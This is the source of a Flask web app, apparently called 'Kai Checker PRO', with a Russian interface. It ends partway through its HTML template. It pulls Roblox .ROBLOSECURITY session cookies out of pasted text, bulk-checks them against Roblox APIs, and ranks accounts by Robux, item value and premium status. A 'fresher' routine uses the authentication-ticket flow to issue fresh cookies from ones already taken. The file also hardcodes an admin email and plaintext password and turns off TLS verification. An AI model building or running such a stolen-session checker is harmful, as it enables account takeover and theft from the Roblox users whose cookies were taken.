import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import sqlite3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session, redirect, url_for

# ==========================================
# ИНИЦИАЛИЗАЦИЯ И БАЗА ДАННЫХ (SQLite)
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
DB_PATH = "data.db"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Расширенная таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE,
                    email TEXT UNIQUE,
                    password TEXT,
                    created_at TEXT,
                    xp INTEGER DEFAULT 250,
                    level INTEGER DEFAULT 5,
                    balance INTEGER DEFAULT 8,
                    checks_count INTEGER DEFAULT 29
                )''')
                
    # История чекера
    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    timestamp TEXT,
                    type TEXT,
                    total INTEGER,
                    valid INTEGER,
                    usernames TEXT,
                    results TEXT,
                    full_reports TEXT
                )''')
                
    # История фрешера
    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    timestamp TEXT,
                    mode TEXT,
                    refreshed_count INTEGER,
                    usernames TEXT,
                    cookies TEXT
                )''')
    
    # Аккаунт по умолчанию CowBoy
    admin_user = "CowBoy"
    admin_email = "semgasigma4@gmail.com"
    admin_pass = "Qk5-sva-8uG"
    c.execute("SELECT id FROM users WHERE username=?", (admin_user,))
    if not c.fetchone():
        hashed_pass = generate_password_hash(admin_pass)
        now_str = datetime.now().strftime('%d.%m.%Y')
        c.execute("INSERT INTO users (username, email, password, created_at, xp, level, balance, checks_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                  (admin_user, admin_email, hashed_pass, now_str, 250, 5, 8, 29))
        logger.info(f"Аккаунт {admin_user} создан!")

    conn.commit()
    conn.close()

init_db()

# ==========================================
# DECORATOR
# ==========================================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==========================================
# ИСТОРИЯ И БД
# ==========================================
def add_checker_history(entry):
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO checker_history (user_id, timestamp, type, total, valid, usernames, results, full_reports)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('type', 'single'),
        entry.get('total', 1),
        entry.get('valid', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('results', []), ensure_ascii=False),
        json.dumps(entry.get('full_reports', []), ensure_ascii=False)
    ))
    # Обновляем XP пользователя за чек
    c.execute("UPDATE users SET xp = xp + ?, checks_count = checks_count + ? WHERE id=?", (entry.get('total', 1)*10, entry.get('total', 1), sid))
    conn.commit()
    conn.close()

def get_checker_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, type, total, valid, usernames, results, full_reports 
                 FROM checker_history WHERE user_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'type': r[1], 'total': r[2], 'valid': r[3],
            'usernames': json.loads(r[4]), 'results': json.loads(r[5]), 'full_reports': json.loads(r[6])
        })
    return history

def clear_checker_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM checker_history WHERE user_id=?", (sid,))
    conn.commit()
    conn.close()

def add_fresher_history(entry):
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO fresher_history (user_id, timestamp, mode, refreshed_count, usernames, cookies)
                 VALUES (?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('mode', 'duplicate'),
        entry.get('refreshed_count', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('cookies', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_fresher_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, mode, refreshed_count, usernames, cookies 
                 FROM fresher_history WHERE user_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'mode': r[1], 'refreshed_count': r[2],
            'usernames': json.loads(r[3]), 'cookies': json.loads(r[4])
        })
    return history

def clear_fresher_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM fresher_history WHERE user_id=?", (sid,))
    conn.commit()
    conn.close()

# ==========================================
# ЧЕКЕР И ФРЕШЕР ЛОГИКА
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_user_rap(session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json().get('data', [])
            val = sum(item.get('recentAveragePrice', 0) for item in data)
            return val if val > 0 else None
    except: pass
    return None

def get_user_playtime(session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            seconds = data.get('totalPlayTimeSeconds', 0)
            if seconds > 0: return round(seconds / 3600, 1)
    except: pass
    return None

def get_full_info(cookie):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json'})

        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=12, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=8)
                return r.json() if r.status_code == 200 else {}
            except: return {}

        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        info['PlaytimeHours'] = get_user_playtime(s, uid)

        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')

        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {
        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
        'cookie':cookie, 'score':0, 'full_info': None
    }
    info = get_full_info(cookie)
    if info['status'] == '✅':
        result['status'] = '✅'; result['username'] = info['Username']; result['user_id'] = info['UserID']
        result['robux'] = info['Robux']; result['rap'] = info['RAP']; result['playtime'] = info['PlaytimeHours']
        result['created'] = info['Created']; result['is_premium'] = info['IsPremium']
        result['has_email'] = info['EmailSet']; result['has_2fa'] = info['TwoFactorEnabled']
        result['full_info'] = info
        score = 0
        if info['Robux'] >= 10000: score += 100
        elif info['Robux'] >= 1000: score += 50
        elif info['Robux'] > 0: score += 10
        if info['RAP'] and info['RAP'] > 5000: score += 50
        if info['IsPremium']: score += 50
        result['score'] = score
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else "🟢")
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | S:{score}"
    return f"❌ НЕВАЛИД"

def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token: return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket: return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if new_cookie_value:
            result['new_cookie'] = new_cookie_value; result['success'] = True
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# SHABLONY (HTML / CSS)
# ==========================================
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "kai_checker_cowboy_key_2026")

AUTH_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Авторизация | Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: #07030d; color: #f3e8ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-card { background: rgba(23, 10, 38, 0.85); border: 1px solid rgba(168, 85, 247, 0.3); padding: 36px; border-radius: 24px; width: 100%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); backdrop-filter: blur(20px); }
        h1 { font-size: 26px; font-weight: 800; text-align: center; margin-bottom: 20px; background: linear-gradient(135deg, #f472b6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-tabs { display: flex; gap: 8px; margin-bottom: 20px; background: rgba(12, 5, 20, 0.8); padding: 4px; border-radius: 12px; }
        .auth-tab { flex: 1; text-align: center; padding: 10px; font-size: 13px; font-weight: 700; color: #a78bfa; cursor: pointer; border-radius: 10px; transition: 0.2s; }
        .auth-tab.active { background: linear-gradient(135deg, #7e22ce, #a855f7); color: #fff; }
        .form-group { margin-bottom: 14px; }
        label { display: block; font-size: 11px; font-weight: 700; color: #a78bfa; margin-bottom: 6px; text-transform: uppercase; }
        input { width: 100%; padding: 12px 16px; background: rgba(12, 5, 20, 0.75); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 12px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #d946ef; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #7e22ce, #a855f7); border: none; border-radius: 12px; color: #fff; font-weight: 700; cursor: pointer; margin-top: 8px; }
        button:hover { opacity: 0.9; }
        .error { color: #fca5a5; font-size: 12px; text-align: center; margin-top: 12px; font-weight: 600; }
        .success { color: #86efac; font-size: 12px; text-align: center; margin-top: 12px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>Kai Checker PRO</h1>
        <div class="auth-tabs">
            <div class="auth-tab {{ 'active' if mode == 'login' else '' }}" onclick="location.href='/login'">Вход</div>
            <div class="auth-tab {{ 'active' if mode == 'register' else '' }}" onclick="location.href='/register'">Регистрация</div>
        </div>

        {% if mode == 'login' %}
        <form method="POST" action="/login">
            <div class="form-group">
                <label>Имя пользователя</label>
                <input type="text" name="username" required placeholder="CowBoy">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Войти</button>
        </form>
        {% else %}
        <form method="POST" action="/register">
            <div class="form-group">
                <label>Имя пользователя</label>
                <input type="text" name="username" required placeholder="AlisRay">
            </div>
            <div class="form-group">
                <label>Gmail (E-mail)</label>
                <input type="email" name="email" required placeholder="example@gmail.com">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Зарегистрироваться</button>
        </form>
        {% endif %}

        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        {% if success %}<div class="success">{{ success }}</div>{% endif %}
    </div>
</body>
</html>"""

INDEX_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #090314;
            --bg-card: rgba(21, 10, 36, 0.7);
            --border-card: rgba(168, 85, 247, 0.2);
            --border-hover: rgba(217, 70, 239, 0.5);
            --input-bg: rgba(12, 5, 22, 0.85);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #9333ea;
            --accent-pink: #c026d3;
            --gradient-btn: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); padding: 20px; }

        .wrapper { max-width: 1350px; margin: 0 auto; }

        /* HEADER & PROFILE WIDGET */
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; position: relative; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(135deg, #f472b6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .header-actions { display: flex; align-items: center; gap: 16px; }
        .theme-toggle { background: var(--bg-card); border: 1px solid var(--border-card); width: 42px; height: 42px; border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #a78bfa; }

        /* PROFILE DROPDOWN (ПО СКРИНУ 1) */
        .profile-widget { position: relative; }
        .profile-btn {
            background: rgba(25, 12, 42, 0.9); border: 1px solid rgba(168, 85, 247, 0.4);
            padding: 6px 16px 6px 8px; border-radius: 30px; display: flex; align-items: center; gap: 10px;
            cursor: pointer; transition: all 0.2s;
        }
        .profile-btn:hover { border-color: var(--accent-pink); }
        .avatar-img { width: 34px; height: 34px; border-radius: 50%; object-fit: cover; border: 1px solid var(--accent-pink); }
        .profile-name { font-weight: 700; font-size: 14px; }
        .profile-balance { color: #c026d3; font-weight: 800; font-size: 14px; margin-left: 4px; }
        .dropdown-arrow { font-size: 10px; color: #a78bfa; margin-left: 2px; }

        .profile-menu {
            position: absolute; right: 0; top: 52px; width: 220px;
            background: #120724; border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 20px; padding: 12px; display: none; flex-direction: column; gap: 6px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 100; backdrop-filter: blur(20px);
        }
        .profile-menu.show { display: flex; }
        .menu-item {
            display: flex; align-items: center; gap: 12px; padding: 12px 14px;
            border-radius: 14px; color: #f3e8ff; text-decoration: none; font-size: 14px; font-weight: 600;
            transition: 0.2s; cursor: pointer;
        }
        .menu-item:hover { background: rgba(168, 85, 247, 0.15); }
        .menu-item.logout { color: #fca5a5; }
        .menu-item.logout:hover { background: rgba(239, 68, 68, 0.15); }
        .menu-icon { width: 32px; height: 32px; border-radius: 10px; background: rgba(168, 85, 247, 0.15); display: flex; align-items: center; justify-content: center; font-size: 14px; }

        /* TABS */
        .tabs { display: flex; gap: 10px; margin-bottom: 24px; background: var(--input-bg); padding: 6px; border-radius: 16px; border: 1px solid var(--border-card); width: fit-content; }
        .tab { padding: 12px 24px; border-radius: 12px; color: var(--text-muted); cursor: pointer; font-size: 14px; font-weight: 700; border: none; background: transparent; }
        .tab.active { background: var(--gradient-btn); color: #fff; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card { background: var(--bg-card); border: 1px solid var(--border-card); border-radius: 20px; padding: 24px; margin-bottom: 20px; }
        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; }

        .btn { padding: 12px 20px; border: none; border-radius: 12px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-primary { background: var(--gradient-btn); }
        .btn-danger { background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; }

        textarea { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main); font-family: monospace; font-size: 12px; }
        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap; margin-top: 10px; }

        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .grid-2 { grid-template-columns: 1fr; } }

        /* СТИЛИ ПРОФИЛЯ ПО СКРИНУ 2 (image_0e8b7a) */
        .profile-header-card {
            background: #110624; border: 1px solid var(--border-card); border-radius: 24px;
            padding: 24px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; flex-wrap: wrap; gap: 20px;
        }
        .user-main { display: flex; align-items: center; gap: 20px; }
        .big-avatar { width: 72px; height: 72px; border-radius: 50%; border: 2px solid var(--accent-pink); object-fit: cover; }
        .user-titles h1 { font-size: 22px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .level-badge { background: #8b5cf6; font-size: 11px; padding: 2px 10px; border-radius: 12px; font-weight: 700; }
        .user-email { color: #a78bfa; font-size: 13px; margin-top: 4px; }
        .xp-bar-wrap { width: 220px; margin-top: 10px; }
        .xp-text { font-size: 11px; color: #a78bfa; margin-top: 4px; }
        .xp-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .xp-fill { height: 100%; width: 25%; background: var(--gradient-btn); }

        .user-stats-top { display: flex; gap: 30px; text-align: right; }
        .stat-item .val { font-size: 20px; font-weight: 800; color: #fff; }
        .stat-item .lbl { font-size: 10px; color: #a78bfa; text-transform: uppercase; margin-top: 2px; }

        .profile-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
        @media(max-width:1000px){ .profile-grid { grid-template-columns: 1fr; } }

        .achieve-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; margin-top: 12px; }
        .achieve-card { background: rgba(18, 7, 36, 0.6); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; text-align: center; }
        .achieve-card .icon { font-size: 24px; margin-bottom: 6px; }
        .achieve-card .title { font-size: 12px; font-weight: 700; }
        .achieve-card .xp { font-size: 10px; color: #c026d3; margin-top: 2px; }

        .ref-box { background: rgba(12, 5, 22, 0.8); border: 1px solid var(--border-card); border-radius: 14px; padding: 12px; display: flex; gap: 10px; margin-top: 10px; }
        .ref-box input { border: none; background: transparent; padding: 0; font-size: 12px; }
    </style>
</head>
<body>

<div class="wrapper">
    <!-- HEADER -->
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        
        <div class="header-actions">
            <div class="theme-toggle">☀️</div>
            
            <!-- ПРОФИЛЬ-ВИДЖЕТ ПО СКРИНУ 1 -->
            <div class="profile-widget">
                <div class="profile-btn" onclick="toggleProfileMenu()">
                    <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="avatar-img">
                    <span class="profile-name">{{ username }}</span>
                    <span class="profile-balance">{{ user.balance }} ₽</span>
                    <span class="dropdown-arrow">▲</span>
                </div>

                <div class="profile-menu" id="profileMenu">
                    <div class="menu-item" onclick="activateTab('profile'); toggleProfileMenu();">
                        <div class="menu-icon">👤</div>
                        <span>Аккаунт</span>
                    </div>
                    <div class="menu-item" onclick="alert('Форма пополнения баланса'); toggleProfileMenu();">
                        <div class="menu-icon">💵</div>
                        <span>Пополнить</span>
                    </div>
                    <div class="menu-item logout" onclick="location.href='/logout'">
                        <div class="menu-icon" style="background:rgba(239, 68, 68, 0.2);">🚪</div>
                        <span>Выйти</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- TABS NAVIGATION -->
    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История (БД)</button>
        <button class="tab" data-tab="profile">👤 Профиль</button>
    </div>

    <!-- 1. ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="grid-2">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <button class="btn btn-primary" onclick="runSingleCheck()" style="margin-top:12px;width:100%;">Проверить кук</button>
                <div class="result-box" id="singleResult" style="display:none;"></div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <input type="file" id="massFile" accept=".txt">
                <button class="btn btn-primary" onclick="runMassCheck()" style="margin-top:12px;width:100%;">🚀 Запустить массовый чек</button>
                <div class="result-box" id="massResult" style="display:none;"></div>
            </div>
        </div>
    </div>

    <!-- 2. ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий</h2>
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <button class="btn btn-primary" onclick="runFresher()" style="margin-top:12px;">⚡ Обновить куки</button>
            <div class="result-box" id="fresherResult" style="display:none;"></div>
        </div>
    </div>

    <!-- 3. ИСТОРИЯ -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                <h2>📋 История Чекера</h2>
                <button class="btn btn-danger" onclick="clearHistory('checker')">🗑️ Очистить</button>
            </div>
            <div id="checkerHistoryList">Загрузка...</div>
        </div>
        <div class="card">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                <h2>🔄 История Фрешера</h2>
                <button class="btn btn-danger" onclick="clearHistory('fresher')">🗑️ Очистить</button>
            </div>
            <div id="fresherHistoryList">Загрузка...</div>
        </div>
    </div>

    <!-- 4. СТРАНИЦА ПРОФИЛЯ ПО СКРИНУ 2 -->
    <div class="tab-content" id="tab-profile">
        <!-- ВЕРХНЯЯ КАРТОЧКА ПОЛЬЗОВАТЕЛЯ -->
        <div class="profile-header-card">
            <div class="user-main">
                <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="big-avatar">
                <div class="user-titles">
                    <h1>{{ username }} <span class="level-badge">☆ Ур. {{ user.level }}</span></h1>
                    <div class="user-email">{{ user.email }}</div>
                    <div class="xp-bar-wrap">
                        <div class="xp-bar"><div class="xp-fill" style="width: {{ (user.xp % 1000) / 10 }}%;"></div></div>
                        <div class="xp-text">{{ user.xp }} / 1000 XP до уровня {{ user.level + 1 }}</div>
                    </div>
                </div>
            </div>

            <div class="user-stats-top">
                <div class="stat-item">
                    <div class="val">{{ user.balance }} ₽</div>
                    <div class="lbl">Баланс</div>
                </div>
                <div class="stat-item">
                    <div class="val">{{ user.checks_count }}</div>
                    <div class="lbl">Заказов</div>
                </div>
                <div class="stat-item">
                    <div class="val">28 дн.</div>
                    <div class="lbl">С нами</div>
                </div>
            </div>
        </div>

        <div class="profile-grid">
            <!-- ЛЕВАЯ КОЛОНКА: АКТИВНОСТЬ И ДОСТИЖЕНИЯ -->
            <div>
                <div class="card">
                    <h2>📊 Финансовая активность</h2>
                    <div style="display:flex;gap:20px;margin-bottom:16px;">
                        <div><strong style="font-size:18px;">240 ₽</strong><br><small style="color:#a78bfa;">Оборот за 7 дней</small></div>
                        <div><strong style="font-size:18px;">{{ user.checks_count }}</strong><br><small style="color:#a78bfa;">Заказов</small></div>
                    </div>
                </div>

                <div class="card">
                    <h2>🏆 Достижения</h2>
                    <div class="achieve-grid">
                        <div class="achieve-card"><div class="icon">🛒</div><div class="title">Первая Искра</div><div class="xp">+100 XP</div></div>
                        <div class="achieve-card"><div class="icon">🖼️</div><div class="title">Галерея Покупок</div><div class="xp">+500 XP</div></div>
                        <div class="achieve-card"><div class="icon">⚡</div><div class="title">Режим Шторм</div><div class="xp">+1000 XP</div></div>
                        <div class="achieve-card"><div class="icon">💼</div><div class="title">Энергия Кошелька</div><div class="xp">+500 XP</div></div>
                    </div>
                </div>
            </div>

            <!-- ПРАВАЯ КОЛОНКА: РЕФЕРАЛКА И НАГРАДЫ -->
            <div>
                <div class="card">
                    <h2>🔗 Реферальная программа</h2>
                    <p style="font-size:12px;color:#a78bfa;">Ваша ссылка:</p>
                    <div class="ref-box">
